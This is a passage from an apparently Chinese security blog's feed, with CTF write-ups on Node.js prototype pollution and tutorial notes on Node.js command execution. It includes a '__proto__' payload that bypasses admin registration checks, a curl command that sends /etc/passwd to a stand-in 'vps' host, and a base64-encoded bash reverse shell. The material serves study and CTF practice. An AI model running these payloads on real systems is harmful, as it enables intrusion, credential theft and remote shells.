  <span class="string">&quot;path&quot;</span>: <span class="string">&quot;^0.12.7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;require-in-the-middle&quot;</span>: <span class="string">&quot;^7.4.0&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// handle/index.js</span></span><br><span class="line"><span class="keyword">var</span> ritm = <span class="built_in">require</span>(<span class="string">&#x27;require-in-the-middle&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> patchChildProcess = <span class="built_in">require</span>(<span class="string">&#x27;./child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> ritm.<span class="title class_">Hook</span>(</span><br><span class="line">    [<span class="string">&#x27;child_process&#x27;</span>],</span><br><span class="line">    <span class="keyword">function</span> (<span class="params"><span class="variable language_">module</span>, name</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (name) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;child_process&#x27;</span>: &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">patchChildProcess</span>(<span class="variable language_">module</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// handle/child_process.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">patchChildProcess</span>(<span class="params">cp</span>) &#123;</span><br><span class="line"></span><br><span class="line">    cp.<span class="property">execFile</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">execFile</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">fork</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">fork</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">spawn</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">spawn</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">execFileSync</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">execFileSync</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line">    cp.<span class="property">execSync</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">execSync</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>() &#125;);</span><br><span class="line">    cp.<span class="property">spawnSync</span> = <span class="keyword">new</span> <span class="title class_">Proxy</span>(cp.<span class="property">spawnSync</span>, &#123; <span class="attr">apply</span>: <span class="title function_">patchOptions</span>(<span class="literal">true</span>) &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">patchOptions</span>(<span class="params">hasArgs</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">apply</span>(<span class="params">target, thisArg, args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> pos = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (pos === args.<span class="property">length</span>) &#123;</span><br><span class="line">            args[pos] = <span class="title function_">prototypelessSpawnOpts</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pos &lt; args.<span class="property">length</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hasArgs &amp;&amp; (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(args[pos]) || args[pos] == <span class="literal">null</span>)) &#123;</span><br><span class="line">                pos++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> args[pos] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; args[pos] !== <span class="literal">null</span>) &#123;</span><br><span class="line">                args[pos] = <span class="title function_">prototypelessSpawnOpts</span>(args[pos]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (args[pos] == <span class="literal">null</span>) &#123;</span><br><span class="line">                args[pos] = <span class="title function_">prototypelessSpawnOpts</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> args[pos] === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">                args.<span class="title function_">splice</span>(pos, <span class="number">0</span>, <span class="title function_">prototypelessSpawnOpts</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> target.<span class="title function_">apply</span>(thisArg, args);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">prototypelessSpawnOpts</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> prototypelessObj = <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), obj);</span><br><span class="line">    prototypelessObj.<span class="property">env</span> = <span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>), prototypelessObj.<span class="property">env</span> || process.<span class="property">env</span>);</span><br><span class="line">    <span class="keyword">return</span> prototypelessObj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = patchChildProcess;</span><br></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>这个博客作者没有仔细看前端代码跑去爆破了<a href="https://xz.aliyun.com/t/15785?time__1311=GqjxnQGQDQoCqGXPeewqQuRDfg/YtDgCaoD#toc-1">详细题解1 有中间思路</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> rce </tag>
            
            <tag> node pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wife_CatCTF22</title>
      <link href="/2024/11/01/wife_CatCTF22/"/>
      <url>/2024/11/01/wife_CatCTF22/</url>
      
        <content type="html"><![CDATA[<blockquote><p>黑盒原型链污染，原型链污染绕过身份验证</p></blockquote><h2 id="分析与尝试-DONE"><a href="#分析与尝试-DONE" class="headerlink" title="分析与尝试 DONE"></a>分析与尝试 DONE</h2><ol><li><p>注意到服务端使用node express框架，可以故意报错搞点信息，比如多谢一个段等</p></li><li><p>先看看node这边的漏洞试试，现在就是要登录为admin用户，猜测flag在admin中，有两个思路</p><ol><li>获取admin的账号与密码</li><li>node相关的可能是原型链污染？服务端<ol><li>admin直接登录，服务端一般会保存一个存有用户信息的对象，这里如果对于普通用户没有设置admin就可能通过原型链进行覆盖(直接clone的话)，如果有设置admin&#x3D;false那就不行 -&gt; 比2有可能，都试试，先这个，<strong>但是这里试试去掉isAdmin&#x3D;false是可以的</strong>，可以从第二种情况去到第一种情况</li><li>注册一个admin用户，这个code涉及到邀请码(不是验证码)的设计，考虑一般和数据库相关，原型链覆盖也无从下手 -&gt; 如果是对象的话在Object处进行覆盖是无法通过原型链访问到的，因为自己就有<strong>可能性不大</strong></li></ol></li></ol></li><li><p>确定先通过admin直接登录探测，下一步就是要找到键了，发现在注册中有一个isAdmin会不会在邀请码对的时候进行clone？试试，想要直接登录的话还是要先注册，普通注册+原型链污染</p></li><li><p>最终payload</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /register <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;h4ck3r&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;aaa&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;isAdmin&quot;</span>:<span class="literal">true</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="题解白盒一下"><a href="#题解白盒一下" class="headerlink" title="题解白盒一下"></a>题解白盒一下</h2><ol><li><em><strong>注意点就是Object.assign()在JSON.parse()下存在原型链污染</strong></em></li><li>可以多多fuzz</li><li><a href="https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/">官方题解的源码</a></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span> (!user.<span class="property">username</span> || !user.<span class="property">password</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;empty username or password&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (users.<span class="title function_">filter</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> == user.<span class="property">username</span>).<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;username already exists&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (user.<span class="property">isAdmin</span> &amp;&amp; user.<span class="property">inviteCode</span> != <span class="variable constant_">INVITE_CODE</span>) &#123;</span><br><span class="line">        user.<span class="property">isAdmin</span> = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;invalid invite code&#x27;</span>, <span class="attr">err</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> newUser = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, baseUser, user)</span><br><span class="line">    users.<span class="title function_">push</span>(newUser)</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">msg</span>: <span class="string">&#x27;user created successfully&#x27;</span>, <span class="attr">err</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> node pp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nodejs安全</title>
      <link href="/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/"/>
      <url>/2024/10/30/Nodejs%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Nodejs前置知识"><a href="#Nodejs前置知识" class="headerlink" title="Nodejs前置知识"></a>Nodejs前置知识</h2><h3 id="CJS-and-EJS"><a href="#CJS-and-EJS" class="headerlink" title="CJS and EJS"></a>CJS and EJS</h3><ol><li><p>CJS（CommonJS）模块和ES6（ECMAScript 2015）模块是JavaScript中两种不同的模块化系统，它们各自有不同的语法和加载机制</p><ol><li>兼容性: 不是所有环境都支持ES6模块，有时需要使用转码器如Babel将ES6代码转换成向后兼容的版本</li></ol></li><li><p>CJS</p><ol><li><strong>同步加载</strong>: 在Node.js环境中，CommonJS模块是同步加载的。这意味着，在执行当前文件代码之前，所有通过 require 加载的依赖都会被解析并执行</li><li>使用场景: 非常适合服务器端应用，因为服务器端通常不需要考虑加载时间的影响</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 模块操作: require和exports</span></span><br><span class="line"><span class="comment">// 导出</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">bar</span> = <span class="string">&#x27;baz&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">const</span> myModule = <span class="built_in">require</span>(<span class="string">&#x27;./myModule&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>ES6</p><ol><li><strong>异步加载</strong>: 异步加载的</li><li><strong>静态</strong>: ES6模块的设计是静态的，即模块的依赖关系必须在编译时确定，这允许工具进行优化，如tree shaking等</li><li>使用场景: 适合现代Web应用，特别是单页应用程序（SPA），以及任何希望利用最新JavaScript特性的项目</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// import和export</span></span><br><span class="line"><span class="comment">// 导出</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> foo = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">baz</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">const</span> bar = <span class="string">&#x27;baz&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">qux</span> = (<span class="params"></span>) =&gt; &#123;&#125;;</span><br><span class="line"><span class="keyword">export</span> &#123; bar, qux &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入</span></span><br><span class="line"><span class="keyword">import</span> &#123; foo, baz &#125; <span class="keyword">from</span> <span class="string">&#x27;./myModule&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> myModule <span class="keyword">from</span> <span class="string">&#x27;./myModule&#x27;</span>; <span class="comment">// 导入整个模块</span></span><br></pre></td></tr></table></figure></li><li><p><strong>分辨</strong></p><ol><li>CommonJS模块和ES6模块的不同可以体现在package.json的type字段，当type字段为空或者为”commonjs”时，当前目录下的.js脚本会解释成CommonJS模块，如果type字段为module,.js解释为ES模块</li></ol></li></ol><h3 id="module-in-CJS"><a href="#module-in-CJS" class="headerlink" title="module in CJS"></a>module in CJS</h3><ol><li><p><strong>什么是模块</strong>: 在Node.js中，模块是指一个文件或一组文件，其中定义了一组相关的函数、变量和对象，以便可以重复使用 -&gt; 每个文件都被视为一个模块，文件路径就是模块名</p></li><li><p><strong>使用模块</strong></p><ol><li><p><strong>加载</strong>: 使用require函数可以加载模块并访问其内容，<code>require()</code>: 这是一个全局函数，用来加载模块。当调用require时，Node.js会查找指定的模块并执行其代码，然后返回该模块的导出对象；</p><ol><li>返回值：<code>require()</code>函数返回<code>module.exports</code>对象</li><li>module.exports：这是一个对象，可以通过赋值给它来导出模块中的内容。<em>默认情况下它是一个空对象</em><ol><li>如果只需要导出一个函数、对象或其他值，可以直接将其赋值给 module.exports</li><li>如果需要导出多个函数或对象，可以将它们作为属性添加到 module.exports 对象中</li></ol></li></ol></li><li><p><strong>共享</strong>: 通过module.exports将模块内的成员共享出去，每个Node.js文件都有一个module变量，<code>module.exports</code>对象用于公开模块中的函数、对象或值，以便它们可以在其他模块中使用。代表当前模块 –&gt; 这里指定add是模块中的add函数这样</p><ol><li>当需要模块时，分配给module.exports的任何内容都可用。</li><li><strong>exports赋值问题</strong><ol><li><code>exports</code>: 是 module.exports 的一个引用， 当你向 exports 添加属性或方法时，你实际上是在修改 module.exports</li><li>如果直接给 exports 赋予一个新的值（比如另一个对象），那么此时 exports 就不再是 module.exports 的引用了，但是不影响 module.exports</li><li>要影响 module.exports 需要直接进行修改</li><li><strong>最佳实践</strong>: exports 应该用来添加属性或方法，而不是重新赋值整个对象。如果你需要替换整个 module.exports 对象，请直接使用 module.exports</li></ol></li></ol>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">subtract</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 导出函数</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">add</span>: add,</span><br><span class="line">  <span class="attr">subtract</span>: subtract</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">const</span> math = <span class="built_in">require</span>(<span class="string">&#x27;./math&#x27;</span>); <span class="comment">// 加载本地模块</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="title function_">add</span>(<span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 输出 5</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(math.<span class="title function_">subtract</span>(<span class="number">5</span>, <span class="number">3</span>)); <span class="comment">// 输出 2</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>缓存</strong>: 当加载模块时，它会被缓存以提高性能；对同一模块的后续require调用将返回缓存的实例，确保该模块仅执行一次</p></li><li><p><strong>module type</strong></p><ol><li>核心模块：这些是由Node.js提供的内置模块，可以直接被<code>require()</code>函数调用，无需安装</li><li>本地模块：这些是你自己创建的文件或者项目中的文件。你可以定义自己的功能并通过exports对象来暴露它们</li><li>第三方模块：这些是从npm (Node Package Manager) 安装的外部库。npm拥有世界上最大的软件注册表，包含了无数个开源包，几乎可以满足任何开发需求 –&gt; 用npm安装后再<code>require()</code></li></ol></li></ol><h3 id="Express中间件"><a href="#Express中间件" class="headerlink" title="Express中间件"></a>Express中间件</h3><h3 id="Nodejs执行系统命令"><a href="#Nodejs执行系统命令" class="headerlink" title="Nodejs执行系统命令"></a>Nodejs执行系统命令</h3><h4 id="Inject-Point-载体≈代码执行"><a href="#Inject-Point-载体≈代码执行" class="headerlink" title="Inject Point(载体≈代码执行)"></a>Inject Point(载体≈代码执行)</h4><ol><li><code>eval(&#39;console.log(&quot;hello world&quot;)&#39;)</code>，类似php eval</li><li>各种类型的回调函数，与时间相关 -&gt; 在漏洞中体现为可控输入(注意原型链)<ol><li><code>Function(&quot;console.log(&#39;HelloWolrd&#39;)&quot;)()</code>类似php的create_function</li><li><code>setTimeout(some_function, 2000)</code></li><li><code>setInteval(some_function, 2000)</code></li></ol></li></ol><h4 id="child-process-内置-module"><a href="#child-process-内置-module" class="headerlink" title="child_process 内置 module"></a>child_process 内置 module</h4><ol><li><p>child_process模块提供了以类似于popen(3)的方式生成子进程的能力，但不完全相同</p></li><li><p>命令<code>console.log(require(&#39;child_process&#39;))</code>返回一下内容 -&gt; 返回的是一个带有很多方法的对象，可以用于执行命令</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">_forkChild</span>: [<span class="title class_">Function</span>: _forkChild],</span><br><span class="line">  <span class="title class_">ChildProcess</span>: [<span class="title class_">Function</span>: <span class="title class_">ChildProcess</span>],</span><br><span class="line">  <span class="attr">exec</span>: [<span class="title class_">Function</span>: exec],</span><br><span class="line">  <span class="attr">execFile</span>: [<span class="title class_">Function</span>: execFile],</span><br><span class="line">  <span class="attr">execFileSync</span>: [<span class="title class_">Function</span>: execFileSync],</span><br><span class="line">  <span class="attr">execSync</span>: [<span class="title class_">Function</span>: execSync],</span><br><span class="line">  <span class="attr">fork</span>: [<span class="title class_">Function</span>: fork],</span><br><span class="line">  <span class="attr">spawn</span>: [<span class="title class_">Function</span>: spawn],</span><br><span class="line">  <span class="attr">spawnSync</span>: [<span class="title class_">Function</span>: spawnSync]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h5 id="1-child-process-exec-command-options-callback-和child-process-execSync-command-options"><a href="#1-child-process-exec-command-options-callback-和child-process-execSync-command-options" class="headerlink" title="1. child_process.exec(command[, options][, callback])和child_process.execSync(command[, options])"></a>1. <code>child_process.exec(command[, options][, callback])</code>和<code>child_process.execSync(command[, options])</code></h5><ol><li><p><code>child_process.exec(command[, options][, callback])</code></p><ol><li><p><strong>不使用callback无法直接获取输出</strong>: 会立即打印出ChildProcess对象，但不会等待命令执行完毕。因此，你看到的是子进程启动时的状态，而不是命令执行的结果 –&gt; <strong>不过命令是会执行的</strong>，需要回显时考虑<code>require(&#39;child_process&#39;).exec(&#39;ls&#39;,(error,stdout,stderr)=&gt;&#123;console.log(stdout)&#125;)</code></p><ol><li>exec函数返回一个ChildProcess对象。这个对象代表了新创建的子进程，并提供了与该子进程交互的方法和属性</li></ol></li><li><p>一些常用的payload</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&#x27;</span>);  <span class="comment">// curl传输文件，可以考虑重定向文件发出信息ls</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ol></li><li><p><code>child_process.execSync(command[, options])</code></p><ol><li><strong>同步阻塞非异步</strong>: exec() 和 execSync() 函数可用于执行命令并返回其输出。exec() 是异步的，这意味着它在命令完成之前就返回，而 execSync() 是同步的，这意味着它在命令完成之前阻塞<ol><li>可以利用这个情况获取输出比如<code>ls</code>命令这些</li></ol></li><li>常见payload和1.中的一样</li></ol></li></ol><h5 id="2-child-process-spawn-command-args-options-和child-process-spawnSync-command-args-options"><a href="#2-child-process-spawn-command-args-options-和child-process-spawnSync-command-args-options" class="headerlink" title="2. child_process.spawn(command[, args][, options])和child_process.spawnSync(command[, args][, options])"></a>2. <code>child_process.spawn(command[, args][, options])</code>和<code>child_process.spawnSync(command[, args][, options])</code></h5><ol><li><code>child_process.spawn(command[, args][, options])</code><ol><li><p><strong>child_process基础函数</strong>: child_process模块中所有函数都是基于spawn和spawnSync函数的来实现的，换句话来说，spawn和spawnSync函数的配置是最完全的，其它函数都是对其做了封装和修改</p></li><li><p><strong>实现子进程与父进程的通信</strong>: child_process.spawn()方法使用给定的command生成一个新进程，并在args中使用命令行参数 -&gt; 命令行参数不用放到command里了</p><ol><li>如果中间数据过多也会阻塞，详见api文档</li></ol> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;spawn&#125;  = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> spawnObj = <span class="title function_">spawn</span>(<span class="string">&#x27;ping&#x27;</span>, [<span class="string">&#x27;127.0.0.1&#x27;</span>], &#123;<span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span>&#125;);</span><br><span class="line">spawnObj.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">chunk</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(chunk.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line">spawnObj.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;);</span><br><span class="line">spawnObj.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="keyword">function</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;close code : &#x27;</span> + code);</span><br><span class="line">&#125;)</span><br><span class="line">spawnObj.<span class="title function_">on</span>(<span class="string">&#x27;exit&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;exit code : &#x27;</span> + code);</span><br><span class="line">    fs.<span class="title function_">close</span>(fd, <span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(err) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>option中有一个shell</p><ol><li>如果启用了shell选项，请勿将未经处理的用户输入传递给此函数。任何包含 shell 元字符的输入都可用于触发任意命令执行</li><li><code>shell &lt;boolean&gt; | &lt;string&gt;</code>如果为true ，则在 shell 内运行command 。在 Unix 上使用’&#x2F;bin&#x2F;sh’ ，在 Windows 上使用process.env.ComSpec 。可以将不同的 shell 指定为字符串。请参阅Shell 要求和默认 Windows shell(在api文档中)。默认值： false （无 shell）</li></ol></li></ol></li><li><code>child_process.spawnSync(command[, args][, 